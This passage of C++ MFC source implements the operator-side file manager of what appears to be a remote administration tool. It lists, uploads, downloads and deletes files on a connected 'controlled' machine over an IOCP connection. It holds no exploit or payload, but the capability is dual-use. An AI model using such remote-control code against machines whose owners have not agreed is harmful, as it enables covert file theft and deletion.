            bPacket[0] = COMMAND_FILE_GETINFO;
            memcpy(bPacket + 1, filename.GetBuffer(0), PacketSize - 1);
            m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
            LocalFree(bPacket);
        }
        return;
    }

    GetRemoteFileList();
    *pResult = 0;
}

void CFileManagerDlg::OnDblclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
{
    if (m_list_remote_driver.GetSelectedCount() == 0)
        return;

    int	nItem = m_list_remote_driver.GetSelectionMark();
    CString	directory = m_list_remote_driver.GetItemText(nItem, 0);
    if (directory.Compare(_T("桌面")) == 0) {
        m_Remote_Directory_ComboBox.SetWindowText(m_strDesktopPath);
        m_list_remote.SetSelectionMark(-1);
        GetRemoteFileList();
        return;
    }
    if (directory.Compare(_T("最近")) == 0) {
        BYTE byToken = COMMAND_FILE_RECENT;
        m_iocpServer->Send2Client(m_ContextObject, &byToken, 1);
        return;
    }
    m_Remote_Path = directory;
    // 发送数据前清空缓冲区
    int	PacketSize = (directory.GetLength() + 1) * sizeof(TCHAR) + 1;
    BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);

    bPacket[0] = COMMAND_LIST_FILES;
    memcpy(bPacket + 1, directory.GetBuffer(0), PacketSize - 1);
    m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
    LocalFree(bPacket);

    m_Remote_Directory_ComboBox.InsertString(0, directory);
    m_Remote_Directory_ComboBox.SetCurSel(0);

    // 得到返回数据前禁窗口
    m_list_remote.EnableWindow(FALSE);
    m_list_remote_driver.EnableWindow(FALSE);
    DRIVE_CAZ = FALSE;
    *pResult = 0;
}

void CFileManagerDlg::OnclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
{
}

void CFileManagerDlg::OnclkListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
}

void CFileManagerDlg::OnclickListSearch(NMHDR* pNMHDR, LRESULT* pResult)
{
}

int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);

void CFileManagerDlg::FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen)
{
    // 重建标题
    m_list_remote.DeleteAllItems();
    int	nItemIndex = 0;
    m_list_remote.SetItemData
    (
        m_list_remote.InsertItem(nItemIndex++, _T(".."), GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
        1
    );
    /*
    ListView 消除闪烁
    更新数据前用SetRedraw(FALSE)
    更新后调用SetRedraw(TRUE)
    */
    m_list_remote.SetRedraw(FALSE);

    if (dwBufferLen != 0) {
        //
        for (int i = 0; i < 2; i++) {
            // 跳过Token，共5字节
            byte* pList = (byte*)(pbBuffer + 1);
            for (byte* pBase = pList; (unsigned long)(pList - pBase) < dwBufferLen - 1;) {
                TCHAR* pszFileName = NULL;
                DWORD	dwFileSizeHigh = 0; // 文件高字节大小
                DWORD	dwFileSizeLow = 0; // 文件低字节大小
                int		nItem = 0;
                bool	bIsInsert = false;
                FILETIME	ftm_strReceiveLocalFileTime;

                int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
                // i 为 0 时，列目录，i为1时列文件
                bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
                pszFileName = (TCHAR*)++pList;

                if (bIsInsert) {
                    int iicon = GetIconIndex(pszFileName, nType);
                    nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, iicon);
                    m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
                    SHFILEINFO	sfi;
                    SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
                    m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
                }

                // 得到文件大小
                pList += (lstrlen(pszFileName) + 1) * sizeof(TCHAR);
                if (bIsInsert) {
                    CString strFileSize;
                    memcpy(&dwFileSizeHigh, pList, 4);
                    memcpy(&dwFileSizeLow, pList + 4, 4);
                    __int64 nFileSize = ((__int64)dwFileSizeHigh << 32) + dwFileSizeLow;
                    if (nFileSize >= 1024 * 1024 * 1024)
                        strFileSize.Format(_T("%0.2f GB"), (double)nFileSize / (1024 * 1024 * 1024));
                    else if (nFileSize >= 1024 * 1024)
                        strFileSize.Format(_T("%0.2f MB"), (double)nFileSize / (1024 * 1024));
                    else
                        strFileSize.Format(_T("%I64u KB"), nFileSize / 1024 + (nFileSize % 1024 ? 1 : 0));
                    m_list_remote.SetItemText(nItem, 1, strFileSize);
                    memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
                    CTime	time(ftm_strReceiveLocalFileTime);
                    m_list_remote.SetItemText(nItem, 3, time.Format(_T("%Y-%m-%d %H:%M")));
                }
                pList += 16;
            }
        }
    }

    m_list_remote.SetRedraw(TRUE);
    // 恢复窗口
    m_list_remote.EnableWindow(TRUE);
    m_list_remote_driver.EnableWindow(TRUE);
    if (DRIVE_CAZ == FALSE) {
        DWORD_PTR dwResult;
        ShowMessage(_T("远程目录：%s"), m_Remote_Path);
        SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    }
}

void CFileManagerDlg::ShowMessage(TCHAR* lpFmt, ...)
{
    TCHAR buff[1024];
    va_list    arglist;
    va_start(arglist, lpFmt);
    memset(buff, 0, sizeof(buff));
    vsprintf_s(buff, lpFmt, arglist);
    DWORD_PTR dwResult;
    SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 0, (LPARAM)buff, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    va_end(arglist);
}

void CFileManagerDlg::OnGo()
{
    m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
    m_Remote_Path += _T("\\");
    GetRemoteFileList(_T(".."));
}

void CFileManagerDlg::OnRemotePrev()
{
    GetRemoteFileList(_T(".."));
}

//////////////////////////////////以下为工具栏响应处理//////////////////////////////////////////

void CFileManagerDlg::OnRemoteView()
{
    static int i = 0;
    switch (i) {
    case 0:
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
        break;
    case 1:
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
        break;
    case 2:
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
        break;
    case 3:
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
        break;
    default:
        break;
    }
    i++;
    if (i > 3) i = 0;
}

void CFileManagerDlg::OnRemoteRecent()
{
    BYTE byToken = COMMAND_FILE_RECENT;
    m_iocpServer->Send2Client(m_ContextObject, &byToken, 1);
}

void CFileManagerDlg::OnRemoteDesktop()
{
    m_Remote_Directory_ComboBox.SetWindowText(m_strDesktopPath);
    m_list_remote.SetSelectionMark(-1);
    GetRemoteFileList();
}

bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
    TCHAR	lpszFilter[MAX_PATH];
    TCHAR* lpszSlash = NULL;
    memset(lpszFilter, 0, sizeof(lpszFilter));

    if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
        lpszSlash = _T("\\");
    else
        lpszSlash = _T("");

    wsprintf(lpszFilter, _T("%s%s*.*"), lpPathName, lpszSlash);

    WIN32_FIND_DATA	wfd;
    HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
        return FALSE;

    do {
        if (wfd.cFileName[0] == _T('.'))
            continue; // 过滤这两个目录
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TCHAR strDirectory[MAX_PATH];
            wsprintf(strDirectory, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
            FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归
        } else {
            CString file;
            file.Format(_T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
            m_Remote_Upload_Job.AddTail(file);
            // 对文件进行操作
        }
    } while (FindNextFile(hFind, &wfd));
    FindClose(hFind); // 关闭查找句柄
    return true;
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
    // 	m_list_local.EnableWindow(bEnable);
    // 	m_Local_Directory_ComboBox.EnableWindow(bEnable);
    m_list_remote.EnableWindow(bEnable);
    m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}

CString CFileManagerDlg::ExtractNameFromFullPath(CString szFullPath)
{
    TCHAR path_buffer[_MAX_PATH];
    TCHAR fname[_MAX_FNAME];
    TCHAR ext[_MAX_EXT];
    _tcscpy_s(path_buffer, szFullPath);
    _tsplitpath_s(szFullPath, NULL, 0, NULL, 0, fname, fname ? _MAX_FNAME : 0, ext, ext ? _MAX_EXT : 0);
    return CString(fname) + CString(ext);
}


void CFileManagerDlg::OnTransferSend()
{
    m_bIsUpload = true;
    // 重置上传任务列表
    m_Remote_Upload_Job.RemoveAll();
    CString	file = GetDirectoryPath(TRUE);
    if (file == "") return;

    m_Local_Path = file.Left(file.ReverseFind(_T('\\')) + 1);
    if (GetFileAttributes(file) & FILE_ATTRIBUTE_DIRECTORY) {
        if (file.GetAt(file.GetLength() - 1) != _T('\\'))
            file += _T("\\");
        FixedUploadDirectory(file.GetBuffer(0));
    } else {
        m_Remote_Upload_Job.AddTail(file);
    }

    if (m_Remote_Upload_Job.IsEmpty()) {
        ::MessageBox(m_hWnd, _T("文件夹为空"), _T("警告"), MB_OK | MB_ICONWARNING);
        return;
    }
    EnableControl(FALSE);
    SendUploadJob();
}

void CFileManagerDlg::TransferSend(CString	file)
{
    if (!m_list_remote.GetItemText(0, 0).Compare(_T("")))
        return;
    m_bIsUpload = true;
    // 重置上传任务列表
    m_Remote_Upload_Job.RemoveAll();
    if (file == "") return;

    m_Local_Path = file.Left(file.ReverseFind(_T('\\')) + 1);
    if (GetFileAttributes(file) & FILE_ATTRIBUTE_DIRECTORY) {
        if (file.GetAt(file.GetLength() - 1) != _T('\\'))
            file += _T("\\");
        FixedUploadDirectory(file.GetBuffer(0));
    } else {
        m_Remote_Upload_Job.AddTail(file);
    }

    if (m_Remote_Upload_Job.IsEmpty()) {
        ::MessageBox(m_hWnd, _T("文件夹为空"), _T("警告"), MB_OK | MB_ICONWARNING);
        return;
    }
    EnableControl(FALSE);
    SendUploadJob();
}

// 获取选择的路径
CString  CFileManagerDlg::GetDirectoryPath(BOOL bIncludeFiles)
{
    CString szSavePath;
    TCHAR szBrowsePath[MAX_PATH];
    ZeroMemory(szBrowsePath, sizeof(szBrowsePath));
    BROWSEINFO bi = { 0 };  //因为已经初始化为0.所以有些项不用再重复赋值了
    bi.hwndOwner = m_hWnd;
    bi.pszDisplayName = szBrowsePath;
    if (bIncludeFiles) {
        bi.lpszTitle = _T("请选择上传路径: ");
        bi.ulFlags = BIF_BROWSEINCLUDEFILES;
    } else {
        bi.lpszTitle = _T("请选择下载路径: ");
        bi.ulFlags = BIF_RETURNONLYFSDIRS;
    }
    LPITEMIDLIST lpiml = { 0 };
    lpiml = SHBrowseForFolder(&bi); //如果没有选中目录，则返回NULL
    if (lpiml && SHGetPathFromIDList(lpiml, szBrowsePath))//从lpiml 中获取路径信息
        szSavePath = szBrowsePath;
    else
        return _T("");
    return szSavePath;
}

//////////////// 文件传输操作 ////////////////
// 只管发出了下载的文件
// 一个一个发，接收到下载完成时，下载第二个文件 ...
void CFileManagerDlg::OnRemoteCopy()
{
    m_bIsUpload = false;
    // 禁用文件管理窗口
    EnableControl(FALSE);

    CString	file;
    m_Remote_Download_Job.RemoveAll();
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
    while (pos) {
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
        // 如果是目录
        if (m_list_remote.GetItemData(nItem))
            file += '\\';
        m_Remote_Download_Job.AddTail(file);
    }
    if (file.IsEmpty()) {
        EnableControl(TRUE);
        ::MessageBox(m_hWnd, _T("请选择文件！"), _T("警告"), MB_OK | MB_ICONWARNING);
        return;
    }

    strLpath = GetDirectoryPath(FALSE);
    if (strLpath == _T("")) {
        EnableControl(TRUE);
        return;
    }
    if (strLpath.GetAt(strLpath.GetLength() - 1) != _T('\\'))
        strLpath += _T("\\");
    m_nTransferMode = TRANSFER_MODE_NORMAL;
    // 发送第一个下载任务
    SendDownloadJob();
}

// 发出一个下载任务
BOOL CFileManagerDlg::SendDownloadJob()
{
    if (m_Remote_Download_Job.IsEmpty())
        return FALSE;

    EnableControl(FALSE);
    // 发出第一个下载任务命令
    CString file = m_Remote_Download_Job.GetHead();
    int		nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
    BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
    bPacket[0] = COMMAND_DOWN_FILES;

    // 文件偏移，续传时用
    memcpy(bPacket + 1, file.GetBuffer(0), (file.GetLength() + 1) * sizeof(TCHAR));
    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
    LocalFree(bPacket);

    // 从下载任务列表中删除自己
    m_Remote_Download_Job.RemoveHead();

    return TRUE;
}

// 发出一个上传任务
BOOL CFileManagerDlg::SendUploadJob()
{
    if (m_Remote_Upload_Job.IsEmpty())
        return FALSE;

    EnableControl(FALSE);
    CString	strDestDirectory = m_Remote_Path;
    // 如果远程也有选择，当做目标文件夹
    int nItem = m_list_remote.GetSelectionMark();

    if (!m_hCopyDestFolder.IsEmpty()) {
        strDestDirectory += m_hCopyDestFolder + _T("\\");
    }

    if (strDestDirectory.IsEmpty()) {
        m_Local_Path = _T("");
        m_Remote_Upload_Job.RemoveHead();
        EnableControl(TRUE);
        ::MessageBox(m_hWnd, _T("请选择目录！"), _T("警告"), MB_OK | MB_ICONWARNING);
        return 0;
    }

    // 发出第一个下载任务命令
    m_strOperatingFile = m_Remote_Upload_Job.GetHead();

    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
    CString	fileRemote = m_strOperatingFile; // 远程文件

    // 得到要保存到的远程的文件路径
    fileRemote.Replace(m_Local_Path, strDestDirectory);
    m_strFileName = m_strUploadRemoteFile = fileRemote;

    if (m_hFileSend != INVALID_HANDLE_VALUE)
        CloseHandle(m_hFileSend);
    m_hFileSend = CreateFile(m_strOperatingFile.GetBuffer(0),
                             GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (m_hFileSend == INVALID_HANDLE_VALUE)
        return FALSE;
    dwSizeLow = GetFileSize(m_hFileSend, &dwSizeHigh);
    m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;
    //CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

    // 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
    int		nPacketSize = (fileRemote.GetLength() + 1) * sizeof(TCHAR) + 9;
    BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
    memset(bPacket, 0, nPacketSize);

    bPacket[0] = COMMAND_FILE_SIZE;
    memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
    memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
    memcpy(bPacket + 9, fileRemote.GetBuffer(0), (fileRemote.GetLength() + 1) * sizeof(TCHAR));
    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
    LocalFree(bPacket);

    // 从下载任务列表中删除自己
    m_Remote_Upload_Job.RemoveHead();
    return TRUE;
}

// 发出一个删除任务
BOOL CFileManagerDlg::SendDeleteJob()
{
    if (m_Remote_Delete_Job.IsEmpty())
        return FALSE;

    EnableControl(FALSE);
    // 发出第一个下载任务命令
    CString file = m_Remote_Delete_Job.GetHead();
    int		nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
    BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

    m_strFileName = file;
    if (file.GetAt(file.GetLength() - 1) == '\\')
        bPacket[0] = COMMAND_DELETE_DIRECTORY;
    else
        bPacket[0] = COMMAND_DELETE_FILE;

    // 文件偏移，续传时用
    memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
    LocalFree(bPacket);

    // 从下载任务列表中删除自己
    m_Remote_Delete_Job.RemoveHead();

    DRIVE_CAZ = TRUE;
    return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
    // 重置计数器
    m_nCounter = 0;

    FILESIZE* pFileSize = (FILESIZE*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
    DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
    DWORD	dwSizeLow = pFileSize->dwSizeLow;
    if (pFileSize->error==FALSE) {
        EnableControl(TRUE);
        return;
    }
    m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;

    // 当前正操作的文件名
    m_strOperatingFile = (TCHAR*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(9));

    m_strReceiveLocalFile = m_strOperatingFile;

    // 得到要保存到的本地的文件路径
    m_strReceiveLocalFile.Replace(m_Remote_Path, strLpath);
    m_strFileName = m_strReceiveLocalFile;

    // 创建多层目录
    MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));

    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);

    if (hFind != INVALID_HANDLE_VALUE
        && m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
        && m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
        && m_nTransferMode != TRANSFER_MODE_JUMP_ALL
       ) {
        CFileTransferModeDlg	dlg(this);
        dlg.m_strFileName = m_strReceiveLocalFile;
        switch (dlg.DoModal()) {
        case IDC_OVERWRITE:
            m_nTransferMode = TRANSFER_MODE_OVERWRITE;
            break;
        case IDC_OVERWRITE_ALL:
            m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
            break;
        case IDC_ADDITION:
            m_nTransferMode = TRANSFER_MODE_ADDITION;
            break;
        case IDC_ADDITION_ALL:
            m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
            break;
        case IDC_JUMP:
            m_nTransferMode = TRANSFER_MODE_JUMP;
            break;
        case IDC_JUMP_ALL:
            m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
            break;
        case IDC_CANCEL:
            m_nTransferMode = TRANSFER_MODE_CANCEL;
            break;
        }
    }

    if (m_nTransferMode == TRANSFER_MODE_CANCEL) {
        // 取消传送
        m_bIsStop = true;
        SendStop(TRUE);
        FindClose(hFind);
        return;
    }

    int	nTransferMode;
    switch (m_nTransferMode) {
    case TRANSFER_MODE_OVERWRITE_ALL:
        nTransferMode = TRANSFER_MODE_OVERWRITE;
        break;
    case TRANSFER_MODE_ADDITION_ALL:
        nTransferMode = TRANSFER_MODE_ADDITION;
        break;
    case TRANSFER_MODE_JUMP_ALL:
        nTransferMode = TRANSFER_MODE_JUMP;
        break;
    default:
        nTransferMode = m_nTransferMode;
    }

    //  1字节Token,四字节偏移高四位，四字节偏移低四位
    BYTE	bToken[9];
    DWORD	dwCreationDisposition; // 文件打开方式
    memset(bToken, 0, sizeof(bToken));
    bToken[0] = COMMAND_CONTINUE;

    // 文件已经存在
    if (hFind != INVALID_HANDLE_VALUE) {
        // 提示点什么
        // 如果是续传
        if (nTransferMode == TRANSFER_MODE_ADDITION) {
            memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
            memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
            // 接收的长度递增
            m_nCounter += (__int64)FindFileData.nFileSizeHigh << 32;
            m_nCounter += FindFileData.nFileSizeLow;

            dwCreationDisposition = OPEN_EXISTING;
        }
        // 覆盖
        else if (nTransferMode == TRANSFER_MODE_OVERWRITE) {
            // 偏移置0
            memset(bToken + 1, 0, 8);
            // 重新创建
            dwCreationDisposition = CREATE_ALWAYS;

        }
        // 跳过，指针移到-1
        else if (nTransferMode == TRANSFER_MODE_JUMP) {
            DWORD dwOffset = -1;
            memcpy(bToken + 1, &dwOffset, 4);
            memcpy(bToken + 5, &dwOffset, 4);
            dwCreationDisposition = OPEN_EXISTING;
            DWORD_PTR dwResult;
            SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 100, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        }
    } else {
        // 偏移置0
        memset(bToken + 1, 0, 8);
        // 重新创建
        dwCreationDisposition = CREATE_ALWAYS;
    }
    FindClose(hFind);

    if (m_hFileRecv != INVALID_HANDLE_VALUE)
        CloseHandle(m_hFileRecv);
    m_hFileRecv = CreateFile(m_strReceiveLocalFile.GetBuffer(0),
                             GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
    // 需要错误处理
    if (m_hFileRecv == INVALID_HANDLE_VALUE) {
        m_nOperatingFileLength = 0;
        m_nCounter = 0;
        ::MessageBox(m_hWnd, m_strReceiveLocalFile + _T(" 文件创建失败"), _T("警告"), MB_OK | MB_ICONWARNING);
        return;
    }

    ShowProgress();
    if (m_bIsStop)
        SendStop(TRUE);
    else {
        // 发送继续传输文件的token,包含文件续传的偏移
        m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
    }
}

// 写入文件内容
void CFileManagerDlg::WriteLocalRecvFile()
{
    // 传输完毕
    BYTE* pData;
    DWORD	dwBytesToWrite;
    DWORD	dwBytesWrite = 0;
    int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
    FILESIZE* pFileSize;
    // 得到数据的偏移
    pData = m_ContextObject->m_DeCompressionBuffer.GetBuffer(nHeadLength);

    pFileSize = (FILESIZE*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
    // 得到数据在文件中的偏移, 赋值给计数器
    //m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

    LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;
    // 得到数据在文件中的偏移, 赋值给计数器
    m_nCounter = MAKEINT64(dwOffsetLow, dwOffsetHigh);

    if (m_nCounter < 0) { //数据出错 返回上传传送数据
        m_nCounter = Bf_nCounters;
        dwOffsetHigh = Bf_dwOffsetHighs;
        dwOffsetLow = Bf_dwOffsetLows;
    } else {
        Bf_nCounters = m_nCounter;
        Bf_dwOffsetHighs = dwOffsetHigh;
        Bf_dwOffsetLows = dwOffsetLow;

        dwBytesToWrite = m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

        SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

        BOOL bResult = FALSE;
        int i = 0;
        for (i = 0; i < MAX_WRITE_RETRY; i++) {
            // 写入文件
            bResult = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
            if (bResult)
                break;
        }
        if (i == MAX_WRITE_RETRY && !bResult) {
            ::MessageBox(m_hWnd, m_strReceiveLocalFile + _T(" 文件写入失败"), _T("警告"), MB_OK | MB_ICONWARNING);
        }
        dwOffsetLow = 0;
        dwOffsetHigh = 0;
        dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
        // 为了比较，计数器递增
        m_nCounter += dwBytesWrite;
        ShowProgress();
    }
    if (m_bIsStop)
        SendStop(TRUE);
    else {
        BYTE	bToken[9];
        bToken[0] = COMMAND_CONTINUE;
        memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
        memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
        m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
    }
}

void CFileManagerDlg::EndLocalRecvFile()
{
    m_nCounter = 0;
    m_strOperatingFile = "";
    m_nOperatingFileLength = 0;

    if (m_hFileRecv != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hFileRecv);
        m_hFileRecv = INVALID_HANDLE_VALUE;
    }

    if (m_Remote_Download_Job.IsEmpty() || m_bIsStop) {
        m_Remote_Download_Job.RemoveAll();
        // 重置传输方式
        m_nTransferMode = TRANSFER_MODE_NORMAL;
        EnableControl(TRUE);
        DWORD_PTR dwResult;
        if (m_bIsStop) {
            SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
                               (LPARAM)_T(" 取消下载"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        } else {
            SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
                               (LPARAM)_T(" 全部完成"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        }
        m_bIsStop = false;
    } else {
        // 我靠，不sleep下会出错，服了可能以前的数据还没send出去
        Sleep(5);
        SendDownloadJob();
    }

    return;
}

void CFileManagerDlg::EndLocalUploadFile()
{
    m_nCounter = 0;
    m_strOperatingFile = _T("");
    m_nOperatingFileLength = 0;

    if (m_hFileSend != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hFileSend);
        m_hFileSend = INVALID_HANDLE_VALUE;
    }
    SendStop(FALSE); // 发了之后, 被控端才会关闭句柄

    if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop) {
        m_Remote_Upload_Job.RemoveAll();
        EnableControl(TRUE);
        GetRemoteFileList(_T("."));
        DWORD_PTR dwResult;
        if (m_bIsStop) {
            SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
                               (LPARAM)_T(" 取消上传"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        } else {
            SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
                               (LPARAM)_T(" 全部完成"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        }
        m_bIsStop = false;
        DRIVE_CAZ = TRUE;
    } else {
        Sleep(5);
        SendUploadJob();
    }
    return;
}

void CFileManagerDlg::EndRemoteDeleteFile()
{
    if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop) {
        m_bIsStop = false;
        EnableControl(TRUE);
        GetRemoteFileList(_T("."));
        DWORD_PTR dwResult;
        if (m_strFileName.GetAt(m_strFileName.GetLength() - 1) == '\\')
            ShowMessage(_T("删除目录：%s (完成)"), m_strFileName);
        else
            ShowMessage(_T("删除文件：%s (完成)"), m_strFileName);
        SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
        DRIVE_CAZ = TRUE;
    } else {
        Sleep(5);
        SendDeleteJob();
    }
    return;
}

void CFileManagerDlg::SendException()
{
    BYTE	bBuff = COMMAND_FILE_EXCEPTION;
    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
}

void CFileManagerDlg::SendContinue()
{
    BYTE	bBuff = COMMAND_CONTINUE;
    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
}

void CFileManagerDlg::SendStop(BOOL bIsDownload)
{
    if (m_hFileRecv != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hFileRecv);
        m_hFileRecv = INVALID_HANDLE_VALUE;
    }
    BYTE	bBuff[2];
    bBuff[0] = COMMAND_STOP;
    bBuff[1] = bIsDownload;
    m_iocpServer->Send2Client(m_ContextObject, bBuff, sizeof(bBuff));
}

void CFileManagerDlg::ShowProgress()
{
    TCHAR* lpDirection = NULL;
    if (m_bIsUpload)
        lpDirection = _T("文件上传");
    else
        lpDirection = _T("文件下载");

    if (m_nCounter == -1) {
        m_nCounter = m_nOperatingFileLength;
    }

    int	progress = (int)((double)(m_nCounter * 100) / m_nOperatingFileLength);
    CString str;
    DWORD_PTR dwResult;
    if (m_nCounter >= 1024 * 1024 * 1024)
        str.Format(_T("%.2f GB (%d%%)"), (double)m_nCounter / (1024 * 1024 * 1024), progress);
    else if (m_nCounter >= 1024 * 1024)
        str.Format(_T("%.2f MB (%d%%)"), (double)m_nCounter / (1024 * 1024), progress);
    else
        str.Format(_T("%I64u KB (%d%%)"), m_nCounter / 1024 + (m_nCounter % 1024 ? 1 : 0), progress);
    ShowMessage(_T("%s: %s"), lpDirection, m_strFileName);
    SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, (WPARAM)progress, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
    SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)str.GetBuffer(0), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);

    if (m_nCounter == m_nOperatingFileLength) {
        m_nCounter = m_nOperatingFileLength = 0;
        // 关闭文件句柄
    }
}

void CFileManagerDlg::OnRemoteDelete()
{
    m_bIsUpload = false;
    // TODO: Add your command handler code here
    CString str;
    if (m_list_remote.GetSelectedCount() > 1)
        str.Format(_T("确定要将这 %d 项删除吗?"), m_list_remote.GetSelectedCount());
    else {
        CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
        if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
